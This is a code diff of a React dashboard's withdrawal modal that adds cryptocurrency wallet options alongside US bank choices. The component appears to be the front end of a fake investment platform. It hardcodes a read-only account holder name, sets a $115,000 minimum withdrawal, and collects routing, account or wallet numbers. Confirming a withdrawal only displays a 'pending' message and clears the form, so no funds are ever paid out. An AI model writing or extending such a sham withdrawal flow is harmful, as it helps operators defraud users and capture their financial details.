@@ -649,153 +649,163 @@ export default function Dashboard() {
       )}
 
       {/* ✅ Withdraw Modal */}
-      {showWithdraw && (
-        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 p-4">
-          <div className="bg-gray-800 rounded-lg shadow-lg p-8 w-full max-w-md text-center relative">
-            <button
-              onClick={() => setShowWithdraw(false)}
-              className="absolute top-3 right-3 text-gray-400 hover:text-gray-200"
+{showWithdraw && (
+  <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 p-4">
+    <div className="bg-gray-800 rounded-lg shadow-lg p-8 w-full max-w-md text-center relative">
+      <button
+        onClick={() => setShowWithdraw(false)}
+        className="absolute top-3 right-3 text-gray-400 hover:text-gray-200"
+      >
+        ✕
+      </button>
+      <h2 className="text-2xl font-bold mb-6 text-indigo-200">
+        Withdraw Funds
+      </h2>
+
+      {/* Balance Check */}
+      {balance < requiredBalance ? (
+        <p className="mb-6 text-sm">
+          <span className="text-red-400">
+            You must have at least ${requiredBalance} to withdraw.
+          </span>{" "}
+          <span className="text-white">Current balance: ${balance}</span>
+        </p>
+      ) : (
+        <>
+          {/* Bank / Wallet Selection */}
+          <div className="mb-4 text-left">
+            <label className="block text-gray-300 font-medium mb-2">
+              Select Bank / Wallet
+            </label>
+            <select
+              value={selectedBank}
+              onChange={(e) => setSelectedBank(e.target.value)}
+              className="w-full px-4 py-2 rounded bg-gray-700 text-white"
             >
-              ✕
-            </button>
-            <h2 className="text-2xl font-bold mb-6 text-indigo-200">
-              Withdraw Funds
-            </h2>
+              <option value="">-- Choose Option --</option>
+              {/* ✅ Bank Options */}
+              <option value="Bank of America">Bank of America</option>
+              <option value="CashApp Account">CashApp</option>
+              <option value="SoFi Bank">SoFi Bank</option>
+              <option value="Wells Fargo">Wells Fargo</option>
+              <option value="Chase">Chase Bank</option>
+              <option value="custom">Other (Type Bank Name)</option>
 
-            {/* Balance Check */}
-            {balance < requiredBalance ? (
-              <p className="mb-6 text-sm">
-                <span className="text-red-400">
-                  You must have at least ${requiredBalance} to withdraw.
-                </span>{" "}
-                <span className="text-white">Current balance: ${balance}</span>
-              </p>
-            ) : (
-              <>
-                {/* Bank Selection */}
-                <div className="mb-4 text-left">
-                  <label className="block text-gray-300 font-medium mb-2">
-                    Select Bank
-                  </label>
-                  <select
-                    value={selectedBank}
-                    onChange={(e) => setSelectedBank(e.target.value)}
-                    className="w-full px-4 py-2 rounded bg-gray-700 text-white"
-                  >
-                    <option value="">-- Choose Bank --</option>
-                    <option value="Bank of America">Bank of America</option>
-                    <option value="CashApp Account">CashApp</option>
-                    <option value="SoFi Bank">SoFi Bank</option>
-                    <option value="Wells Fargo">Wells Fargo</option>
-                    <option value="Chase">Chase Bank</option>
-                    <option value="custom">Other (Type Bank Name)</option>
-                  </select>
-                </div>
+              {/* ✅ Wallet Options */}
+              <option value="USDT (TRC20)">USDT (TRC20)</option>
+              <option value="BTC">Bitcoin (BTC)</option>
+              <option value="ETH">Ethereum (ETH)</option>
+              <option value="SOL">Solana (SOL)</option>
+            </select>
+          </div>
 
-                {/* Custom Bank Name */}
-                {selectedBank === "custom" && (
-                  <div className="mb-4 text-left">
-                    <label className="block text-gray-300 font-medium mb-2">
-                      Enter Bank Name
-                    </label>
-                    <input
-                      type="text"
-                      value={customBank}
-                      onChange={(e) => setCustomBank(e.target.value)}
-                      className="w-full px-4 py-2 rounded bg-gray-700 text-white"
-                    />
-                  </div>
-                )}
+          {/* Custom Bank Name */}
+          {selectedBank === "custom" && (
+            <div className="mb-4 text-left">
+              <label className="block text-gray-300 font-medium mb-2">
+                Enter Bank Name
+              </label>
+              <input
+                type="text"
+                value={customBank}
+                onChange={(e) => setCustomBank(e.target.value)}
+                className="w-full px-4 py-2 rounded bg-gray-700 text-white"
+              />
+            </div>
+          )}
 
-                {/* Account Details */}
-                {selectedBank && (
-                  <>
-                    <div className="mb-4 text-left">
-                      <label className="block text-gray-300 font-medium mb-2">
-                        Account Name
-                      </label>
-                      <input
-                        type="text"
-                        value="Marvin Lane O'Dell"
-                        readOnly
-                        className="w-full px-4 py-2 rounded bg-gray-600 text-white cursor-not-allowed"
-                      />
-                    </div>
+          {/* Account Details */}
+          {selectedBank && (
+            <>
+              <div className="mb-4 text-left">
+                <label className="block text-gray-300 font-medium mb-2">
+                  Account Name
+                </label>
+                <input
+                  type="text"
+                  value="Marvin Lane O'Dell"
+                  readOnly
+                  className="w-full px-4 py-2 rounded bg-gray-600 text-white cursor-not-allowed"
+                />
+              </div>
 
-                    <div className="mb-4 text-left">
-                      <label className="block text-gray-300 font-medium mb-2">
-                        Routing Number
-                      </label>
-                      <input
-                        type="text"
-                        value={routingNumber}
-                        onChange={(e) => setRoutingNumber(e.target.value)}
-                        className="w-full px-4 py-2 rounded bg-gray-700 text-white"
-                      />
-                    </div>
+              <div className="mb-4 text-left">
+                <label className="block text-gray-300 font-medium mb-2">
+                  Routing Number
+                </label>
+                <input
+                  type="text"
+                  value={routingNumber}
+                  onChange={(e) => setRoutingNumber(e.target.value)}
+                  className="w-full px-4 py-2 rounded bg-gray-700 text-white"
+                />
+              </div>
 
-                    <div className="mb-4 text-left">
-                      <label className="block text-gray-300 font-medium mb-2">
-                        Account Number
-                      </label>
-                      <input
-                        type="text"
-                        value={accountNumber}
-                        onChange={(e) => setAccountNumber(e.target.value)}
-                        className="w-full px-4 py-2 rounded bg-gray-700 text-white"
-                      />
-                    </div>
+              <div className="mb-4 text-left">
+                <label className="block text-gray-300 font-medium mb-2">
+                  Account Number / Wallet Address
+                </label>
+                <input
+                  type="text"
+                  value={accountNumber}
+                  onChange={(e) => setAccountNumber(e.target.value)}
+                  className="w-full px-4 py-2 rounded bg-gray-700 text-white"
+                />
+              </div>
 
-                    <div className="mb-4 text-left">
-                      <label className="block text-gray-300 font-medium mb-2">
-                        Amount
-                      </label>
-                      <input
-                        type="number"
-                        value={withdrawAmount}
-                        onChange={(e) => setWithdrawAmount(e.target.value)}
-                        className="w-full px-4 py-2 rounded bg-gray-700 text-white"
-                      />
-                    </div>
+              <div className="mb-4 text-left">
+                <label className="block text-gray-300 font-medium mb-2">
+                  Amount
+                </label>
+                <input
+                  type="number"
+                  value={withdrawAmount}
+                  onChange={(e) => setWithdrawAmount(e.target.value)}
+                  className="w-full px-4 py-2 rounded bg-gray-700 text-white"
+                />
+              </div>
 
-                    <button
-                      onClick={() => {
-                        if (withdrawAmount < 115000) {
-                          setWithdrawMessage(
-                            "The minimum withdrawal is $115,000.",
-                          );
-                          setShowWithdrawPopup(true);
-                          return;
-                        }
+              <button
+                onClick={() => {
+                  if (withdrawAmount < 115000) {
+                    setWithdrawMessage("The minimum withdrawal is $115,000.");
+                    setShowWithdrawPopup(true);
+                    return;
+                  }
 
-                        if (withdrawAmount > balance) {
-                          setWithdrawMessage(
-                            "You do not have enough funds to withdraw that amount.",
-                          );
-                          setShowWithdrawPopup(true);
-                          return;
-                        }
+                  if (withdrawAmount > balance) {
+                    setWithdrawMessage(
+                      "You do not have enough funds to withdraw that amount."
+                    );
+                    setShowWithdrawPopup(true);
+                    return;
+                  }
 
-                        setWithdrawMessage(
-                          `Withdrawal Pending! Will take up to 24 hours or more depending on the status of recipient\nBank: ${
-                            selectedBank === "custom"
-                              ? customBank
-                              : selectedBank
-                          }\nAccount: ${accountNumber}\nAmount: ${withdrawAmount}`,
-                        );
-                        setShowWithdrawPopup(true);
+                  setWithdrawMessage(
+                    `Withdrawal Pending! Will take up to 24 hours or more depending on the status of recipient\nMethod: ${
+                      selectedBank === "custom" ? customBank : selectedBank
+                    }\nAccount/Wallet: ${accountNumber}\nAmount: ${withdrawAmount}`
+                  );
+                  setShowWithdrawPopup(true);
 
-                        setShowWithdraw(false);
-                        setSelectedBank("");
-                        setCustomBank("");
-                        setRoutingNumber("");
-                        setAccountNumber("");
-                        setWithdrawAmount("");
-                      }}
-                      className="px-6 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700 transition"
-                    >
-                      Confirm Withdrawal
-                    </button>
+                  setShowWithdraw(false);
+                  setSelectedBank("");
+                  setCustomBank("");
+                  setRoutingNumber("");
+                  setAccountNumber("");
+                  setWithdrawAmount("");
+                }}
+                className="px-6 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700 transition"
+              >
+                Confirm Withdrawal
+              </button>
+            </>
+          )}
+        </>
+      )}
+    </div>
+  </div>
+)}
 
                     {/* ✅ Popup Modal */}
                     {showWithdrawPopup && (
